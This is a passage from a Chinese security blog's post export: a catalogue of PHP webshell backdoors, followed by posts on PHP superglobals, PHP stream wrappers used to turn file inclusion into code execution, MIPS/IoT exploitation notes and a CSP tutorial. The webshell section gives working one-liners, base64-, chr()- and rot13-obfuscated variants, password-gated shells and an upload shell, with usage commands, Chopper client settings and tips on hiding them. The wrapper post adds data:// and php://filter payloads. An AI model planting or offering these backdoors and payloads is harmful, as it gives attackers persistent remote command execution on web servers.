array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?&gt;get/post: expdoor=system(\"ls\"); 123456789101112131415161718&lt;?php @preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); ?&gt;mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )◆i ：如果在修饰符中加上\"i\"，则正则将会取消大小写敏感性，即\"a\"和\"A\" 是一样的。◆m：默认的正则开始\"^\"和结束\"$\"只是对于正则字符串如果在修饰符中加上\"m\"，那么开始和结束将会指字符串的每一行：每一行的开头就是\"^\"，结尾就是\"$\"。◆s：如果在修饰符中加入\"s\"，那么默认的\".\"代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！◆x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。◆e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。◆A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说\"/a/A\"匹配\"abcd\"。◆E：与\"m\"相反，如果使用这个修饰符，那么\"$\"将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。◆U：和问号的作用差不多，用于设置\"贪婪模式\"。http://localhost/test2.php?u=eval($_POST[c]);post: c=system(\"ls\");菜刀中：密码：c配置：&lt;O&gt;u=eval($_POST[c]);&lt;/O&gt; 123456789&lt;?php eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));?&gt;其实其将//&lt;?phpeval($_POST[door])//?&gt;多次base64加密解密，并且在一定程度上进行了混淆(插入了chr(47))post: door=system(\"ls\"); 1234567891011121314&lt;?php @include($_FILES['u']['tmp_name']); ?&gt;上传一个木马文件，最好的方式是上传一个大马，这样对方就很难进行测试请求：/index.php?c=system('ls');Content-Type: multipart/form-data; boundary=---------------------------262952846810849 -----------------------------262952846810849Content-Disposition: form-data; name=\"u\"; filename=\"easy.php\"Content-Type: application/octet-stream&lt;?php @eval($_GET[c]); ?&gt;-----------------------------262952846810849-- 12345&lt;?phpif($_GET[\"hackers\"]==\"2b\")&#123;if ($_SERVER['REQUEST_METHOD'] == 'POST') &#123; echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_exists($_FILES[\"upfile\"][\"name\"]))&#123; copy($_FILES[\"upfile\"][\"tmp_name\"], $_FILES[\"upfile\"][\"name\"]); &#125;&#125;?&gt;&lt;form method=\"post\" enctype=\"multipart/form-data\"&gt;&lt;input name=\"upfile\" type=\"file\"&gt;&lt;input type=\"submit\" value=\"ok\"&gt;&lt;/form&gt;&lt;?php &#125;?&gt;用法：上传木马文件，最好还是上传大马！ 12345&lt;?php $s=@$_GET[2];if(md5($s.$s)==\"c70d1cfca94435256f2874706af4c3c8\")@eval($_REQUEST[$s]); ?&gt;用法：get: ?2=moushenpost/get: moushen=system(\"ls\"); 12345678910111213141516&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?&gt;等价于：&lt;?php$_uU=\"chr\";$_cC=\"eval($_POST[1]);\";$_fF=\"create_function\";$_=create_function(\"\",\"eval($_POST[1]);\");$_(); // 将上面的语句进行执行string create_function ( string $args , string $code )$args是参数(\"$a,$b,$c\")，$code是执行代码，返回的是函数名要调用时，直接在函数名后面加上()即可。但是需要注意的是，一定不能直接加在create_function之后，需要将其返回给一个变量，然后调用！使用：post: 1=system(\"ls\"); 12345678910&lt;?phpmd5($_GET['qid'])=='ba710ce1a217e63bf9f5ac483d2e9a6f'?array_map(\"as\\x73ert\",(array)$_REQUEST['page']):next;?&gt;array array_map ( callable $callback , array $array1 [, array $... ] )array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 使用：?qid=moushenhaopost/get: page 为了迷惑敌人，可以在shell中加入大量空格、换行！！ 1234567891011121314&lt;?php$dI3h=$&#123;'_REQUEST'&#125;; if (!empty($dI3h['PBbs'])) &#123; $lwA = $dI3h['UpB_']; $SdlT=$dI3h['PBbs']($lwA($dI3h['PWWk']),$lwA($dI3h['xfrwA'])); $SdlT($lwA($dI3h['Epd'])); &#125;?&gt;知识点：$&#123;'xxx'&#125;,其实代表的就是$xxx，其指代的是一个变量上面的构造有很多种，但是最容易发现的就是create_function使用：?PBbs=create_function&amp;UpB_=str_rot13&amp;PWWk=$a&amp;xfrwA=riny($a);&amp;Epd=flfgrz(yf);每次只需要更改Epd字段的内容即可，对于要输入的字段，每次都是需要rot13的。 其实也可以让其看起来简单点：trim/ltrim/rtrim/strtolower/strtoupper?PBbs=create_function&amp;UpB_=trim&amp;PWWk=$n&amp;xfrwA=eval($n);&amp;Epd=system(ls); 123456789101112131415### php一句话* &lt;?php eval($_POST[sb]);?&gt;* &lt;?php @eval($_POST[sb]);?&gt;* &lt;?php assert($_POST[sb]);?&gt;* &lt;?$_POST['sa']($_POST['sb']);?&gt;* &lt;?$_POST['sa']($_POST['sb'],$_POST['sc'])?&gt;* &lt;?php @preg_replace(\"/[email]/e\",$_POST['h'],\"error\"); ?&gt; //使用这个后,使用菜刀一句话客户端在配置连接的时候在\"配置\"一栏输入 &lt;O&gt;h=@eval($_POST[c]);&lt;/O&gt;* &lt;script language=\"php\"&gt;@eval($_POST[sb])&lt;/script&gt;* $filename=$_GET['xbid']; include ($filename);* &lt;?php $c='ass'.'ert';$&#123;c&#125;($_POST[4]);?&gt;* &lt;?php $k = str_replace(\"8\",\"\",\"a8s88s8e8r88t\");$k($_POST[\"8\"]); ?&gt; 当然，后门还有很多很多种，php小马、大马都值得我们学习，但是只需要学学就可以了，不必专注于此！！！","tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"php全局变量","date":"2017-08-27T15:35:21.000Z","path":"2017/08/27/php全局变量/","text":"php全局变量$\\_REQUEST$\\_REQUEST 收集GET或者POST数据，如果GET和POST同时有数据，则优先取POST数据。使用超级全局变量 $_REQUEST 来收集 input 标签的值。此例是使用本文件处理表单！ 123456789101112131415&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;];?&gt;&quot;&gt;Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php $name = $_REQUEST[&apos;fname&apos;]; echo $name; ?&gt;&lt;/body&gt;&lt;/html&gt; $\\_POST$\\_POST 广泛用于收集提交 method=&quot;post&quot; 的 HTML 表单后的表单数据。$_POST 也常用于传递变量。 $\\_GET$_GET 可用于收集提交 HTML 表单 (method=&quot;get&quot;) 之后的表单数据。也可以收集 URL 中的发送的数据。 $\\_COOKIE$\\_COOKIE 用于取回 cookie 的值。 $\\_SESSION$\\_SESSION 存储和取回 session 变量 session中的变量不能通过请求来传递，但是可以响应时通过PHP处理函数进行赋值，而且如果想全局使用，必须加上session_start(); $GLOBALS$GLOBALS 引用全局作用域中可用的全部变量 1234567891011&lt;?php $x = 75; $y = 25; function addition() &#123; $GLOBALS[&apos;z&apos;] = $GLOBALS[&apos;x&apos;] + $GLOBALS[&apos;y&apos;]; &#125; addition(); echo $z; ?&gt; $\\_SERVER$_SERVER 保存关于报头、路径和脚本位置的信息 元素/代码 描述 $_SERVER[&#39;PHP_SELF&#39;] 返回当前执行脚本的文件名。http://example.com/test.php/foo.bar 的脚本中使用 $_SERVER[&#39;PHP_SELF&#39;] 将得到 /test.php/foo.bar $_SERVER[&#39;argv&#39;] 传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。 $_SERVER[&#39;argc&#39;] 包含命令行模式下传递给该脚本的参数的数目(如果运行在命令行模式下)。 $_SERVER[&#39;GATEWAY_INTERFACE&#39;] 返回服务器使用的 CGI 规范的版本。 $_SERVER[&#39;SERVER_ADDR&#39;] 返回当前运行脚本所在的服务器的 IP 地址。 $_SERVER[&#39;SERVER_NAME&#39;] 返回当前运行脚本所在的服务器的主机名（比如 www.w3school.com.cn）。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。Note: 在 Apache 2 里，必须设置 UseCanonicalName = On 和 ServerName。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值。 $_SERVER[&#39;SERVER_SOFTWARE&#39;] 返回服务器标识字符串,在响应请求时的头信息中给出（比如 Apache/2.2.24）。 $_SERVER[&#39;SERVER_PROTOCOL&#39;] 返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。 $_SERVER[&#39;REQUEST_METHOD&#39;] 返回访问页面使用的请求方法（例如 POST/HEAD/PUT/GET）。Note:如果请求方法为 HEAD，PHP 脚本将在发送 Header 头信息之后终止(这意味着在产生任何输出后，不再有输出缓冲)。 $_SERVER[&#39;REQUEST_TIME&#39;] 返回请求开始时的时间戳（例如 1577687494）。&gt;5.1.0 $_SERVER[&#39;REQUEST_TIME_FLOAT&#39;] 返回请求开始时的时间戳，微秒级别的精准度。&gt;5.4.0 $_SERVER[&#39;DOCUMENT_ROOT&#39;] 当前运行脚本所在的文档根目录。在服务器配置文件中定义。 $_SERVER[&#39;QUERY_STRING&#39;] 返回查询字符串，如果是通过查询字符串访问此页面。 $_SERVER[&#39;HTTP_ACCEPT&#39;] 返回来自当前请求的请求头。 $_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;] 返回来自当前请求的 Accept-Charset 头（ 例如 utf-8,ISO-8859-1） $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;] 当前请求头中 Accept-Language: 项的内容，如果存在的话。例如：“en”。 $_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;] 当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。 $_SERVER[&#39;HTTP_CONNECTION&#39;] 当前请求头中 Connection: 项的内容，如果存在的话。例如：“Keep-Alive”。 $_SERVER[&#39;HTTP_HOST&#39;] 返回来自当前请求的 Host 头。 $_SERVER[&#39;HTTP_REFERER&#39;] 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。 $_SERVER[&#39;HTTP_USER_AGENT&#39;] 当前请求头中 User-Agent: 项的内容，如果存在的话。该字符串表明了访问该页面的用户代理的信息。一个典型的例子是：Mozilla/4.5 [en] (X11; U; Linux 2.2.9 i586)。除此之外，你可以通过 get_browser() 来使用该值，从而定制页面输出以便适应用户代理的性能。 $_SERVER[&#39;HTTPS&#39;] 是否通过安全 HTTP 协议查询脚本。Note: 注意当使用 IIS 上的 ISAPI 方式时，如果不是通过 HTTPS 协议被访问，这个值将为 off。 $_SERVER[&#39;HTTP_VIA&#39;] 返回Via中的代理服务器IP $_SERVER[&#39;HTTP_CLIENT_IP&#39;] 返回Client-IP中的客户端IP $_SERVER[&#39;REMOTE_ADDR&#39;] 返回浏览当前页面的用户的 IP 地址。 $_SERVER[&#39;HTTP_X\\_FORWARDED\\_FOR&#39;] 返回X-Forwarded-For内容 $_SERVER[&#39;REMOTE_HOST&#39;] 返回浏览当前页面的用户的主机名。Note: 你的服务器必须被配置以便产生这个变量。例如在 Apache 中，你需要在 httpd.conf 中设置 HostnameLookups On 来产生它。参见 gethostbyaddr()。 $_SERVER[&#39;REMOTE_PORT&#39;] 返回用户机器上连接到 Web 服务器所使用的端口号。 $_SERVER[&#39;REMOTE_USER&#39;] 经验证的用户 $_SERVER[&#39;REDIRECT_REMOTE_USER&#39;] 验证的用户，如果请求已在内部重定向。 $_SERVER[&#39;SCRIPT_FILENAME&#39;] 返回当前执行脚本的绝对路径。Note:如果在命令行界面（Command Line Interface, CLI）使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER[&#39;SCRIPT_FILENAME&#39;] 将包含用户指定的相对路径。 $_SERVER[&#39;SERVER_ADMIN&#39;] 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。 $_SERVER[&#39;SERVER_PORT&#39;] Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。Note: 在 Apache 2 里，为了获取真实物理端口，必须设置 UseCanonicalName = On 以及 UseCanonicalPhysicalPort = On。 否则此值可能被伪造，不一定会返回真实端口值。 上下文有安全性要求的环境里，不应该依赖此值。 $_SERVER[&#39;SERVER_SIGNATURE&#39;] 返回服务器版本和虚拟主机名。 $_SERVER[&#39;PATH_TRANSLATED&#39;] 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。Note: 自 PHP 4.3.2 起，PATH_TRANSLATED 在 Apache 2 SAPI 模式下不再和 Apache 1 一样隐含赋值，而是若 Apache 不生成此值，PHP 便自己生成并将其值放入 SCRIPT_FILENAME 服务器常量中。这个修改遵守了 CGI 规范，PATH_TRANSLATED 仅在 PATH_INFO 被定义的条件下才存在。 Apache 2 用户可以在 httpd.conf 中设置 AcceptPathInfo = On 来定义 PATH_INFO。 $_SERVER[&#39;SCRIPT_NAME&#39;] 返回当前脚本的路径 $_SERVER[&#39;SCRIPT_URI&#39;] 返回当前页面的 URI。 $_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;] 返回Upgrade-Insecure-Requests中的数据 $_SERVER[&quot;HTTP_CACHE_CONTROL&quot;] 返回Cache-Control中的数据 &#39;PHP_AUTH_DIGEST&#39; 当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的“Authorization” HTTP 头内容（以便作进一步的认证操作）。 &#39;PHP_AUTH_USER&#39; 当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。 &#39;PHP_AUTH_PW&#39; 当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。 &#39;AUTH_TYPE&#39; 当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。 &#39;PATH_INFO&#39; 包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息，如果存在的话。例如，如果当前脚本是通过 URL http://www.example.com/php/path_info.php/some/stuff?foo=bar 被访问，那么 $_SERVER[&#39;PATH_INFO&#39;] 将包含 /some/stuff。 &#39;ORIG_PATH_INFO&#39; 在被 PHP 处理之前，“PATH_INFO” 的原始版本。 $\\_FILES$_FILES 可以从客户计算机向远程服务器上传文件。 第一个参数是表单的 input name，第二个下标可以是 &quot;name&quot;, &quot;type&quot;, &quot;size&quot;, &quot;tmp_name&quot; 或 &quot;error&quot; 例子： $_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称 $_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型 $_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计 $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称 $_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码 $\\_ENV$_ENV 通过环境方式传递给当前脚本的变量的数组。 这些变量被从 PHP 解析器的运行环境导入到 PHP 的全局命名空间。很多是由支持 PHP 运行的 Shell 提供的，并且不同的系统很可能运行着不同种类的 Shell，所以不可能有一份确定的列表。请查看你的 Shell 文档来获取定义的环境变量列表。其他环境变量包含了 CGI 变量，而不管 PHP 是以服务器模块还是 CGI 处理器的方式运行。 元素/代码 描述 $_ENV[&quot;ALLUSERSPROFILE&quot;] C:\\Documents and Settings\\All Users $_ENV[&quot;ClusterLog&quot;] C:\\WINDOWS\\Cluster\\cluster.log $_ENV[&quot;CommonProgramFiles&quot;] C:\\Program Files\\Common Files $_ENV[&quot;COMPUTERNAME&quot;] LIUBO $_ENV[&quot;ComSpec&quot;] C:\\WINDOWS\\system32\\cmd.exe $_ENV[&quot;FP_NO_HOST_CHECK&quot;] NO $_ENV[&quot;NUMBER_OF_PROCESSORS&quot;] 1 $_ENV[&quot;OS&quot;] Windows_NT $_ENV[&quot;Path&quot;] C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;E:\\Program Files\\MySQL\\MySQL Server 5.0\\bin;c:\\php;c:\\php\\ext $_ENV[&quot;PATHEXT&quot;] .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH $_ENV[&quot;PROCESSOR_ARCHITECTURE&quot;] x86 $_ENV[&quot;PROCESSOR_IDENTIFIER&quot;] x86 Family 15 Model 4 Stepping 1, GenuineIntel $_ENV[&quot;PROCESSOR_LEVEL&quot;] 15 $_ENV[&quot;PROCESSOR_REVISION&quot;] 0401 $_ENV[&quot;ProgramFiles&quot;] C:\\Program Files $_ENV[&quot;SystemDrive&quot;] C: $_ENV[&quot;SystemRoot&quot;] C:\\WINDOWS $_ENV[&quot;TEMP&quot;] d:\\ $_ENV[&quot;TMP&quot;] d:\\ $_ENV[&quot;USERPROFILE&quot;] C:\\Documents and Settings\\Default User $_ENV[&quot;windir&quot;] C:\\WINDOWS","tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"php伪协议","date":"2017-08-26T16:37:29.000Z","path":"2017/08/27/php伪协议/","text":"本文参考的是 Hello_C的php伪协议这篇文章，内容大部分时粘贴过来的。当然也参考了先知上的文章：https://xianzhi.aliyun.com/forum/mobile/read/795.html——如何优雅的把lfi转化为rce（2017-02-27更新版）。当然，先知上的文章有点问题，因为web用户可能没有那么高的权限去访问log文件或者打开allow_url_include设置。 PHP协议/封装协议 包装或协议 控制能力 allow_url_include 漏洞类型 备注 file:// - Off LFI /文件操作 glob:// - Off 目录遍历 php://filter/read include Off 文件泄露 PHP：//filter/read=convert.base64-encode/resource=index.php php://filter/write file_put_contents Off 编码 file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”); php://input include On RCE Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt; data:// include On RCE data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4= zip:// include + uploaded file Off RCE phar:// include + uploaded file Off RCE PHP版本&gt; = 5.3 php中支持的伪协议 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 这里可以参考官方文档进行查看。而遇见最多的也就是php://协议了： php://stdin主要用于php cli的输入 12345&lt;?php while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))&#123; echo fgets($line); &#125; ?&gt; php://stdout主要用于php cli的输入&lt;?php $fh = fopen(&#39;php://stdout&#39;, &#39;w&#39;); fwrite($fh, &quot;标准输出php://stdout\\n&quot;); fclose($fh); fwrite(STDOUT, &quot;标准输出STDOUT\\n&quot;); ?&gt; php://input可以读取到post没有解析的原始数据&lt;?php echo file_get_contents($_GET[&quot;a&quot;]); ?&gt; 当php代码换成 1234&lt;?php $code = $_GET[&apos;a&apos;]; include($code); ?&gt; 而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。 php://output是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区&lt;?php $code=$_GET[&quot;a&quot;]; file_put_contents($code,&quot;test&quot;); ?&gt; php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用&lt;?php $filename=$_GET[&quot;a&quot;]; $data=&quot;test&quot;; file_put_contents($filename, $data); ?&gt; ?a=php://filter/write=string.tolower/resource=test.php可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：其中 ：（1）string.tolower //写入内容全部变成小写（2）string.toupper //写入内容全部变成大写（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码通过：?a=php://filter/convert.base64-encode/resource=test.php可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件 123456789&lt;?php $filename=$_GET[&quot;a&quot;]; echo file_get_contents($filename); ?&gt; &lt;?php $filename=$_GET[&quot;a&quot;]; include(&quot;$filename&quot;); ?&gt; ?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来 双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串 那么可以用?hax=expect://command 来执行任意linux指令，但是：Note:该封装协议默认未开启为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。 data://数据流封装器当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行&lt;?php $filename=$_GET[&quot;a&quot;]; include(&quot;$filename&quot;); ?&gt; 参考链接：http://blog.csdn.net/niexinming/article/details/52605144 本文作者： Hello_C 本文链接： http://yoursite.com/代码/2017/04/09/PHP伪协议.html 版权声明： 本博客所有文章除特别声明外，均采用 CC BY-NC-SA 3.0 许可协议。转载请注明出处！","tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"XMAN之旅——MIPS","date":"2017-08-16T07:10:28.000Z","path":"2017/08/16/XMAN之旅——MIPS/","text":"IOT(Internet of Things) 物联网CAN协议TTP协议介质访问控制模式CSMA/CDGPS系统遥控obd定位解锁功能 智能联网汽车信息安全状况 MIPSRISC架构通用寄存器 32个特殊寄存器 PC hI IO指令定长有大端和小端两种指令还有地址 都是 4字节对齐的数据访问严格4 字节对其流水线 xss(不是很严重)CSRF认证漏洞命令注入（针对后端的lua 脚本) mips不会自动刷新shellcode 被存于数据的cache中cacch incoherency 使用busybox 启用 reverse shell 由于不能直接与cgi进行交互，可以使用 reverse shellwget一个 -W hexdump-A 分析指令架构 寻找各种架构的函数projoque binwalk -M 使用 ROP或者其他啊手段一次请求启动reverse shell定位 binary 地组织，可以在同样的环境中进行调试，或者调用其他漏洞的leak MIPS的shellcode 开发 ropgadget使用 IDA的插件 MIPS ROP Finder(可以支持定制搜索) 找可用gadget向已知地址执行shellcoderop执行system binutils-mips-linux-gnuqemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn300 qemu-mipselMIPS库环境库安装 qemu-mipsuser mode 直接运行用户程序需要完整的librarysystem mode 直接模拟mips系统 gdb servergdb-multiarchIDA debugger mips rop gadgetMIPS汇编语言逆向工具 基于 MIPS或者 ARM架构的 openwrt普通用户没有 root shell基于 busyboxlibc 和一般的linux 不同 使用 uclibc(提供基本的嵌入式函数，比较小，节省内存空间) binwalkfirmware-mod-kit 用于开发板的调试输出root Image 或者之际给出系统的rootshell辅助分析 USB2TLTx端链接开发板RxRx端链接开发板TxGND链接GND 与UART交互 GDN groundTX transmit 发送引脚 3.3vRX recive 接受引脚 3.3。vVCC 电源 一般电压为3.3-5v openwrtEmbedded linuxVxWorksuClinuxFreeRTOS 与段 与攻击一个web站点类似(比较少，和攻击一个web差不多）正对设备与网关，网关与云端之间的嗅探身份伪造等通过针对设备以及网关的固件你想利用漏洞获取权限","tags":[{"name":"mips","slug":"mips","permalink":"http://yoursite.com/tags/mips/"}]},{"title":"内容安全策略(CSP)","date":"2017-08-14T07:08:31.000Z","path":"2017/08/14/内容安全策略-CSP/","text":"跨域脚本攻击 XSS 是最常见、危害最大的网页安全漏洞。 为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？ 这就是&quot;网页安全政策&quot;（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。 一、简介CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。 CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。 两种方法可以启用 CSP。一种是通过 HTTP 头信息的Content-Security-Policy的字段。 1234&gt; Content-Security-Policy: script-src &apos;self&apos;; object-src &apos;none&apos;;&gt; style-src cdn.example.org third-party.org; child-src https:&gt;&gt; 另一种是通过网页的&lt;meta&gt;标签。 123&gt; &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;&gt;&gt; 上面代码中，CSP 做了如下配置。 脚本：只信任当前域名 &lt;object&gt;标签：不信任任何URL，即不加载任何资源 样式表：只信任cdn.example.org和third-party.org 框架（frame）：必须使用HTTPS协议加载 其他资源：没有限制 启用后，不符合 CSP 的外部资源就会被阻止加载。 Chrome 的报错信息。 Firefox 的报错信息。 二、限制选项CSP 提供了很多限制选项，涉及安全的各个方面。 2.1 资源加载限制以下选项限制各类资源的加载。 script-src：外部脚本 style-src：样式表 img-src：图像 media-src：媒体文件（音频和视频） font-src：字体文件 object-src：插件（比如 Flash） child-src：框架 frame-ancestors：嵌入的外部资源（比如、、和） connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等） worker-src：worker脚本 manifest-src：manifest 文件 2.2 default-srcdefault-src用来设置上面各个选项的默认值。 123&gt; Content-Security-Policy: default-src &apos;self&apos;&gt;&gt; 上面代码限制所有的外部资源，都只能从当前域名加载。 如果同时设置某个单项限制（比如font-src）和default-src，前者会覆盖后者，即字体文件会采用font-src的值，其他资源依然采用default-src的值。 2.3 URL 限制有时，网页会跟其他 URL 发生联系，这时也可以加以限制。 frame-ancestors：限制嵌入框架的网页 base-uri：限制&lt;base#href&gt; form-action：限制&lt;form#action&gt; 2.4 其他限制其他一些安全相关的功能，也放在了 CSP 里面。 block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启） upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议 plugin-types：限制可以使用的插件格式 sandbox：浏览器行为的限制，比如不能有弹出窗口等。 2.5 report-uri有时，我们不仅希望防止 XSS，还希望记录此类行为。report-uri就用来告诉浏览器，应该把注入行为报告给哪个网址。 123&gt; Content-Security-Policy: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;&gt;&gt; 上面代码指定，将注入行为报告给/my_amazing_csp_report_parser这个 URL。 浏览器会使用POST方法，发送一个JSON对象，下面是一个例子。 1234567891011&gt; &#123;&gt; &quot;csp-report&quot;: &#123;&gt; &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,&gt; &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,&gt; &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,&gt; &quot;violated-directive&quot;: &quot;script-src &apos;self&apos; https://apis.google.com&quot;,&gt; &quot;original-policy&quot;: &quot;script-src &apos;self&apos; https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;&gt; &#125;&gt; &#125;&gt;&gt; 三、Content-Security-Policy-Report-Only除了Content-Security-Policy，还有一个Content-Security-Policy-Report-Only字段，表示不执行限制选项，只是记录违反限制的行为。 它必须与report-uri选项配合使用。 123&gt; Content-Security-Policy-Report-Only: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;&gt;&gt; 四、选项值每个限制选项可以设置以下几种值，这些值就构成了白名单。 主机名：example.org，https://example.com:443 路径名：example.org/resources/js/ 通配符：*.example.org，*://*.example.com:*（表示任意协议、任意子域名、任意端口） 协议名：https:、data: 关键字&#39;self&#39;：当前域名，需要加引号 关键字&#39;none&#39;：禁止加载任何外部资源，需要加引号 多个值也可以并列，用空格分隔。 123&gt; Content-Security-Policy: script-src &apos;self&apos; https://apis.google.com&gt;&gt; 如果同一个限制选项使用多次，只有第一次会生效。 1234567&gt; # 错误的写法&gt; script-src https://host1.com; script-src https://host2.com&gt;&gt; # 正确的写法&gt; script-src https://host1.com https://host2.com&gt;&gt; 如果不设置某个限制选项，就是默认允许任何值。 五、script-src 的特殊值除了常规值，script-src还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。 &#39;unsafe-inline&#39;：允许执行页面内嵌的&amp;lt;script&gt;标签和事件监听函数 unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。 nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行 hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。 nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。 123&gt; Content-Security-Policy: script-src &apos;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&apos;&gt;&gt; 页面内嵌脚本，必须有这个token才能执行。 12345&gt; &lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;&gt; // some code&gt; &lt;/script&gt;&gt;&gt; hash值的例子如下，服务器给出一个允许执行的代码的hash值。 123&gt; Content-Security-Policy: script-src 